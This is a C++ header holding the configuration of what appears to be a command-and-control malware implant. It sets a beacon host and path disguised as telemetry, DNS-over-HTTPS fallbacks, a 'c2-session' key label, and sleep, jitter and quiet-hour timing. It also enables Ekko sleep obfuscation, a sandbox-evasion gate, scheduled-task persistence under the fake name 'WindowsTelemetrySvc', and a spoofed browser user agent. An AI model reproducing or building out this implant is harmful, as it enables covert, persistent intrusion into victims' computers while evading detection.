#pragma once
#include <cstdint>
#include <string>
#include <vector>

namespace cfg {

static const char* kBeaconHost = "cdn-metrics.example.com";
static const char* kBeaconPath = "/api/v2/telemetry";
static const int   kBeaconPort = 443;

static const char* kDohV4   = "https://1.1.1.1/dns-query?name=%s&type=A";
static const char* kDohV6   = "https://[2606:4700:4700::1111]/dns-query?name=%s&type=A";
static const char* kDohAlt  = "https://8.8.8.8/resolve?name=%s&type=A";

static const uint8_t kServerPin[32] = {
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};
static const char* kInfo = "c2-session-v2";

static const int kSleepMs      = 60000;
static const int kJitterPct    = 40;
static const int kQuietStartH  = 2;
static const int kQuietEndH    = 5;
static const int kQuietSleepMs = 4 * 3600 * 1000;

static const bool kUseEkko     = true;
static const bool kSandboxGate = true;

enum class Persist { None, RunKey, ScheduledTask, Service };
static const Persist kPersist = Persist::ScheduledTask;
static const char* kPersistName = "WindowsTelemetrySvc";

static const char* kUserAgent =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

}
